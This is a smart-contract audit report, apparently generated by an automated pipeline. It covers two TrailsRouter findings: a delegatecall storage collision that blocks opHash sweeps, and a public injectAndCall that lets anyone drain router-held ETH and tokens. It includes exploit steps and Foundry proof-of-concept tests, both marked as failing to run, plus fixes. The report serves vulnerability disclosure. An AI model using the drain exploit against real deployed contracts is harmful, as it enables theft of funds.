# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern

USING MULTI_PATTERN_TO_FINDING_ANALYSIS_MODE = false; and gpt-5.1
NICHE_PATTERN_ANALYSIS_MODE = false;
Update finding prompt (short version)
Update pattern generation prompt with (short version) -> short version BOMBED CONFIRMED

 **Derived From** : Tstorish storage flag collides under delegatecall, breaking sentinel reads/writes

[M-1]. Delegatecall storage collision in validateOpHashAndSweep DoSes opHash-based sweeps
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : injectAndCall missing delegatecall guard lets anyone drain router-held funds

[L-2]. Public injectAndCall lets anyone drain all ETH/ERC20 held by TrailsRouter
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 0
- M: 1
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : Tstorish storage flag collides under delegatecall, breaking sentinel reads/writes

## [M-1]. Delegatecall storage collision in validateOpHashAndSweep DoSes opHash-based sweeps

### Finding Severity Justification: The issue correctly identifies that Tstorish’s `_tstoreSupport` flag lives in storage slot 0 and that TrailsRouter is always executed via delegatecall inside a Sequence wallet. Under delegatecall, `_tstoreSupport` reads from the wallet’s slot 0, not an isolated router slot, so its value is effectively controlled by the wallet’s own storage layout. On chains without native TSTORE/TLOAD at deployment, `_getTstorish` is configured to the `*_WithSloadFallback` versions, which branch on `_tstoreSupport`. If a wallet ever sets a non-zero value in slot 0, `_getTstorishWithSloadFallback` will use `tload` instead of `sload`. On pre-TSTORE chains this would cause invalid-opcode reverts; on chains where TSTORE/TLOAD later become available and `__activateTstore` is called, `_getTstorish` will read from transient storage while the sentinel is written with `sstore`, so `validateOpHashAndSweep` never sees `SUCCESS_VALUE`. In both cases, sweeps gated by `validateOpHashAndSweep` are blocked, preventing fee or payout sweeps but not directly stealing user funds (funds remain in the wallet and can still be moved via other wallet mechanisms). This is a protocol-availability / functionality break on a core path rather than direct asset theft, fitting Medium impact per C4 rubric.
## Derived From Pattern/Invariant
Tstorish storage flag collides under delegatecall, breaking sentinel reads/writes

## Exploit Type
StorageLayout

## Location
TrailsRouter.validateOpHashAndSweep

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter inherits Tstorish, which introduces a storage flag `_tstoreSupport` in slot 0 and a helper `_getTstorish` that chooses between `sload` and `tload` based on this flag.

In Tstorish:

```solidity
contract Tstorish {
    bool private _tstoreSupport; // slot 0

    function _getTstorishWithSloadFallback(uint256 storageSlot)
        private
        view
        returns (uint256 value)
    {
        if (_tstoreSupport) {
            assembly { value := tload(storageSlot) }
        } else {
            assembly { value := sload(storageSlot) }
        }
    }

    function(uint256) view returns (uint256) internal immutable _getTstorish;
}
```

TrailsRouter uses `_getTstorish` inside a delegatecall-only function to read the success sentinel:

```solidity
function validateOpHashAndSweep(bytes32 opHash, address _token, address _recipient)
    public
    payable
    onlyDelegatecall
{
    uint256 slot = TrailsSentinelLib.successSlot(opHash);
    if (_getTstorish(slot) != TrailsSentinelLib.SUCCESS_VALUE) {
        revert SuccessSentinelNotSet();
    }
    sweep(_token, _recipient);
}
```

Because `validateOpHashAndSweep` is guarded by `onlyDelegatecall`, it is always executed via `delegatecall` from a wallet (e.g. Sequence v3). Under `delegatecall`, **all storage reads in TrailsRouter code operate on the caller wallet’s storage**, not on TrailsRouter’s own storage. That means `_tstoreSupport` actually refers to **wallet storage slot 0**, whose value is entirely controlled by the wallet implementation and its normal state.

On chains where `tload` is not supported at deployment time (the expected current environment), Tstorish sets `_getTstorish = _getTstorishWithSloadFallback`. In that case:
- If the wallet’s storage slot 0 is 0, `_getTstorish(slot)` does `sload(slot)` and sentinel reads work.
- If the wallet’s storage slot 0 is **non-zero** (very likely for any non-trivial wallet), `_tstoreSupport` is seen as `true` and `_getTstorish(slot)` executes `tload(slot)` instead of `sload(slot)`.

This creates two failure modes for `validateOpHashAndSweep` when called via delegatecall:
1. **Pre-TSTORE chains:** `tload` is an invalid opcode. As soon as a wallet uses a non-zero value in storage slot 0, `_getTstorish` will try to execute `tload`, causing an invalid opcode and reverting `validateOpHashAndSweep` **even if the sentinel has been correctly written with `sstore` by TrailsRouterShim or any other code**.
2. **Chains with TSTORE/TLOAD support, or future activation:** even when `tload` is supported, `validateOpHashAndSweep` will read from **transient storage**. The sentinel for an `opHash` is written to a *persistent* storage slot (via `sstore`), but `_getTstorish` will look in transient storage when `_tstoreSupport != 0`. Since transient storage is cleared at the end of each transaction, any sentinel written in a previous transaction is invisible, so `_getTstorish(slot)` returns 0 and `SuccessSentinelNotSet()` is always thrown.

In both cases, the root cause is a classic storage collision in a delegatecall-based module:
- Tstorish’s internal flag `_tstoreSupport` lives at slot 0 and is **not namespaced**.
- TrailsRouter is designed to be delegatecalled into arbitrary wallet storage, but Tstorish assumes it owns slot 0.
- When wallet slot 0 is non-zero, `_getTstorish` silently switches to `tload` in a context where the sentinel has been written with `sstore` and may even be on a chain without `tload` support.

As a result, `validateOpHashAndSweep` can permanently revert or permanently fail to see valid success sentinels for affected wallets, breaking the invariant that a successful opHash must allow a follow-up sweep.

## Impact
For any wallet that delegatecalls into TrailsRouter and has a non-zero value in storage slot 0, validateOpHashAndSweep will either always revert (invalid opcode from tload on pre-TSTORE chains) or always read 0 from transient storage and trigger SuccessSentinelNotSet. This bricks the opHash-based gating used to authorize sweeps and fee claims. Destination-chain sweeps that depend on validating an origin opHash cannot complete, leaving bridged funds and protocol/relayer fees stuck inside the wallet until some out-of-band recovery path is used. The core invariant that a previously-set success sentinel reliably unlocks a sweep is violated.

## Command to Run Test


## Proof of Concept
1. Deploy TrailsRouter on a chain where TSTORE/TLOAD are not initially supported (the current expected environment). Tstorish configures _getTstorish = _getTstorishWithSloadFallback.
2. Deploy a wallet-like contract that:
   - Stores a non-zero value in slot 0 (e.g., a simple `uint256 public slot0Value = 1;`).
   - Has a helper to manually write the success sentinel into the expected storage slot using standard `sstore`:
     - Compute `slot = TrailsSentinelLib.successSlot(opHash)` and `sstore(slot, 1)`.
   - Has a function that delegatecalls TrailsRouter.validateOpHashAndSweep(opHash, token, recipient).
3. Fund the wallet with some ETH or ERC20 tokens and call the helper to set the sentinel for a chosen `opHash`.
4. From an EOA, call the wallet’s `validateAndSweep` helper so it delegatecalls TrailsRouter.validateOpHashAndSweep.
5. Inside TrailsRouter under delegatecall:
   - `_tstoreSupport` is read from wallet slot 0 and is non-zero.
   - `_getTstorishWithSloadFallback` chooses the `tload(storageSlot)` branch.
   - Because tload is unsupported on this chain, the call hits an invalid opcode and the entire delegatecall reverts, or on a chain that supports tload it reads from transient storage, returning 0.
   - `validateOpHashAndSweep` never reaches `sweep`; instead it reverts (invalid opcode or SuccessSentinelNotSet).
6. Observe that the wallet retains its full token/ETH balance and no Sweep event is emitted, even though we correctly wrote SUCCESS_VALUE to the sentinel slot. Any relayer or protocol logic relying on validateOpHashAndSweep to unlock fees/destination funds is permanently blocked for this wallet.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/TrailsRouter.sol";
import "../src/libraries/TrailsSentinelLib.sol";

contract MockWallet {
    // Occupies storage slot 0 with a non-zero value, simulating a wallet that uses slot 0
    uint256 public slot0Value;

    constructor() {
        slot0Value = 1; // non-zero so Tstorish sees _tstoreSupport == true under delegatecall
    }

    // Manually set the SUCCESS sentinel in persistent storage, as the shim would
    function setSuccessSentinel(bytes32 opHash) external {
        uint256 slot = TrailsSentinelLib.successSlot(opHash);
        assembly {
            sstore(slot, 1) // TrailsSentinelLib.SUCCESS_VALUE
        }
    }

    // Delegatecall into TrailsRouter.validateOpHashAndSweep
    function validateAndSweep(address router, bytes32 opHash, address token, address recipient) external {
        bytes memory data = abi.encodeWithSelector(TrailsRouter.validateOpHashAndSweep.selector, opHash, token, recipient);
        (bool ok, bytes memory ret) = router.delegatecall(data);
        require(ok, string(ret));
    }

    receive() external payable {}
}

contract TstorishCollisionTest is Test {
    TrailsRouter router;
    MockWallet wallet;
    bytes32 opHash;

    function setUp() public {
        router = new TrailsRouter();
        wallet = new MockWallet();
        opHash = keccak256("op-1");

        // Fund the wallet with ETH that validateOpHashAndSweep is supposed to sweep
        vm.deal(address(wallet), 10 ether);

        // Set the SUCCESS sentinel in the wallet's persistent storage
        wallet.setSuccessSentinel(opHash);
    }

    function testValidateOpHashAndSweepRevertsEvenWhenSentinelIsSet() public {
        address recipient = address(0xBEEF);
        uint256 walletBalanceBefore = address(wallet).balance;
        uint256 recipientBalanceBefore = recipient.balance;

        // Because TrailsRouter is delegatecalled and wallet.slot0Value != 0,
        // Tstorish reads _tstoreSupport as true and uses tload instead of sload.
        // This causes either an invalid opcode (pre-TSTORE chains) or a 0 read
        // from transient storage, so validateOpHashAndSweep reverts instead of sweeping.
        vm.expectRevert();
        wallet.validateAndSweep(address(router), opHash, address(0), recipient);

        // No funds were swept despite the sentinel being set
        assertEq(address(wallet).balance, walletBalanceBefore);
        assertEq(recipient.balance, recipientBalanceBefore);
    }
}


## Suggested Mitigation
Do not use Tstorish's `_tstoreSupport`-gated helpers in a delegatecall-based module where the storage context belongs to an external wallet. In particular, TrailsRouter.validateOpHashAndSweep should read the sentinel directly from persistent storage instead of via `_getTstorish`.

A concrete fix:
- Remove `Tstorish` from the inheritance list of TrailsRouter, or at least stop using `_getTstorish` for sentinel reads.
- Replace the body of validateOpHashAndSweep with an explicit `sload` on the hashed sentinel slot:

```solidity
function validateOpHashAndSweep(bytes32 opHash, address _token, address _recipient)
    public
    payable
    onlyDelegatecall
{
    uint256 slot = TrailsSentinelLib.successSlot(opHash);
    uint256 value;
    assembly {
        value := sload(slot)
    }
    if (value != TrailsSentinelLib.SUCCESS_VALUE) {
        revert SuccessSentinelNotSet();
    }
    sweep(_token, _recipient);
}
```

If Tstorish is still desired elsewhere, modify it so `_tstoreSupport` is stored in a namespaced slot (e.g., using a `bytes32`-keyed mapping or an ERC-7201-style namespace) and add a guard to prevent its use under delegatecall (e.g., only allow `_getTstorish` when `address(this)` equals the implementation's own address). This ensures the router's internal feature flags cannot collide with host wallet storage.





 **Derived From** : injectAndCall missing delegatecall guard lets anyone drain router-held funds

## [L-2]. Public injectAndCall lets anyone drain all ETH/ERC20 held by TrailsRouter

### Finding Severity Justification: The reported behavior is real: injectAndCall can be called directly on the TrailsRouter implementation and will use the router’s own ETH/ERC20 balances. However, this only affects funds that are mistakenly or unexpectedly sent to the router contract itself (e.g., user error, airdrops, or misconfigured integrations). The protocol is explicitly designed to be non‑custodial, with user assets held in Sequence wallets / intent contracts, and normal flows do not rely on the router holding funds. Thus the impact is limited to accidental or stray balances, not core protocol funds. Under Code4rena rules, issues arising from user mistakes or sending funds to the wrong address are at most QA/Low, not Medium/High.
## Derived From Pattern/Invariant
injectAndCall missing delegatecall guard lets anyone drain router-held funds

## Exploit Type
AuthByPass

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The TrailsRouter `injectAndCall` helper is designed for Sequence wallet **delegatecall** usage, but is exposed as a normal public function with **no access control**. When called directly on the deployed router contract, it operates on the router’s own balances instead of a wallet’s balances.

Vulnerable code:

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) {
            revert NoEthAvailable();
        } else {
            revert NoTokensToSweep();
        }
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}

function _getSelfBalance(address token) internal view returns (uint256) {
    return _getBalance(token, address(this));
}

function _injectAndExecuteCall(
    address token,
    address target,
    bytes memory callData,
    uint256 amountOffset,
    bytes32 placeholder,
    uint256 callerBalance
) internal {
    // ... optional calldata surgery ...

    if (token == address(0)) {
        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    } else {
        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);

        (bool success, bytes memory result) = target.call(callData);
        emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
        if (!success) revert TargetCallFailed(result);
    }
}
```

Unlike the sweeper functions, which are explicitly restricted to delegatecall context:

```solidity
function sweep(address _token, address _recipient) public payable onlyDelegatecall { ... }
function refundAndSweep(...) public payable onlyDelegatecall { ... }
function validateOpHashAndSweep(...) public payable onlyDelegatecall { ... }
```

`injectAndCall` has **no** `onlyDelegatecall` guard. When called directly on the deployed router address:

* `_getSelfBalance(token)` reads the router’s **own** ETH or ERC20 balance.
* `_injectAndExecuteCall` then:
  * For ETH: forwards **all** ETH held by the router to an arbitrary `target` via `target.call{value: callerBalance}(callData)`.
  * For ERC20: calls `forceApprove(token, target, callerBalance)` granting `target` an allowance equal to the router’s entire token balance, and then calls arbitrary `callData` on `target`.

This effectively exposes a publicly callable, permissionless **sweep** primitive over all funds held by the router contract. Any ETH or ERC20 tokens ever held by the router (e.g., from misconfigured `pullAndExecute` calls with stray `msg.value`, mistaken direct transfers to the router, airdrops, or unforeseen integrations that send funds to the router) can be drained by anyone.

This matches the AccessControl/AuthByPass pattern: a balance-moving helper intended for delegatecall-only wallet context is left unguarded and operates on the router’s own balances, enabling unauthorized drains.

## Impact
Any ETH or ERC20 tokens held by the deployed TrailsRouter address can be fully stolen by an arbitrary account. While the protocol aims to be non-custodial and router balances are not expected in normal flows, any funds that do end up at the router (due to e.g. misconfigured calls, stray msg.value, direct transfers, or airdrops) become globally stealable instead of merely stuck. This turns accidental or transient router balances into a direct asset loss vector.

## Command to Run Test


## Proof of Concept
1. Assume the TrailsRouter has some ETH or tokens on it. This can happen, for example, if a user mistakenly calls `pullAndExecute` with `token != address(0)` and a non-zero `msg.value`, or someone transfers ERC20 tokens directly to the router.
2. Let `R` be the deployed TrailsRouter and `A` be an attacker EOA.
3. For ETH:
   - Attacker calls `R.injectAndCall(token = address(0), target = A, callData = "", amountOffset = 0, placeholder = 0)`.
   - Inside `injectAndCall`, `callerBalance = address(R).balance` (the router’s whole ETH balance).
   - `_injectAndExecuteCall` executes `target.call{value: callerBalance}("")`, sending all router ETH to `A`.
4. For ERC20 tokens `T`:
   - Attacker deploys a malicious contract `AttackTarget` with a function `drain()` that, when called by the router, executes `IERC20(T).transferFrom(address(this), attacker, IERC20(T).balanceOf(address(this)))`.
   - Attacker calls `R.injectAndCall(token = T, target = AttackTarget, callData = abi.encodeWithSignature("drain()"), amountOffset = 0, placeholder = 0)`.
   - `callerBalance` becomes `IERC20(T).balanceOf(R)`, the router’s entire token balance.
   - `_injectAndExecuteCall` grants `AttackTarget` an allowance of `callerBalance` via `forceApprove(T, AttackTarget, callerBalance)`.
   - Then it calls `AttackTarget.drain()`, which uses the allowance to pull all tokens from the router to the attacker.
5. In both cases, the attacker fully drains the router’s ETH/token balance with a single, permissionless transaction.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";

contract InjectAndCallExploitTest is Test {
    TrailsRouter router;
    address attacker = address(0xABCD);

    function setUp() public {
        router = new TrailsRouter();

        // Fund the router with 1 ether, simulating any source of ETH stuck on the router
        vm.deal(address(this), 10 ether);
        (bool ok,) = address(router).call{value: 1 ether}("");
        require(ok, "funding router failed");

        // Give attacker some ETH for gas
        vm.deal(attacker, 1 ether);

        // Make gas free in tests so balances are easier to reason about
        vm.txGasPrice(0);
    }

    function test_AttackerCanDrainRouterEthViaInjectAndCall() public {
        uint256 routerBalanceBefore = address(router).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        assertEq(routerBalanceBefore, 1 ether, "router should start with 1 ETH");

        // Attacker directly calls injectAndCall on the deployed router
        vm.prank(attacker);
        router.injectAndCall(
            address(0), // token = native ETH
            attacker,    // target = attacker EOA
            "",         // empty calldata
            0,
            bytes32(0)
        );

        uint256 routerBalanceAfter = address(router).balance;
        uint256 attackerBalanceAfter = attacker.balance;

        // Router's ETH has been drained
        assertEq(routerBalanceAfter, 0, "router ETH balance should be zero after attack");

        // Attacker's balance increased by exactly the router's previous balance
        assertEq(
            attackerBalanceAfter,
            attackerBalanceBefore + routerBalanceBefore,
            "attacker should receive all router ETH"
        );
    }
}


## Suggested Mitigation
Align `injectAndCall` with its intended delegatecall-only semantics and avoid operating on the router’s own balances:

1. Restrict `injectAndCall` to delegatecall context, mirroring the sweeper functions:

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable onlyDelegatecall {
    uint256 callerBalance = _getSelfBalance(token);
    if (callerBalance == 0) {
        if (token == address(0)) revert NoEthAvailable();
        else revert NoTokensToSweep();
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}
```

   In this design, non-delegatecall (standalone) flows should use `injectSweepAndCall`, which already pulls funds from `msg.sender` and never touches router-held balances.

2. Alternatively, if a public, non-delegatecall variant is desired, change it to operate on the caller’s balance instead of the router’s, and remove any reliance on router-held funds:

```solidity
function injectAndCall(
    address token,
    address target,
    bytes calldata callData,
    uint256 amountOffset,
    bytes32 placeholder
) public payable {
    uint256 callerBalance;
    if (token == address(0)) {
        callerBalance = msg.value;
        if (callerBalance == 0) revert NoEthSent();
    } else {
        callerBalance = _getBalance(token, msg.sender);
        if (callerBalance == 0) revert NoTokensToSweep();
        _safeTransferFrom(token, msg.sender, address(this), callerBalance);
    }

    _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
}
```

Either approach removes the ability for arbitrary callers to sweep the router’s own ETH/ERC20 balances while preserving the intended functionality for Sequence delegatecall flows and standalone balance injection.



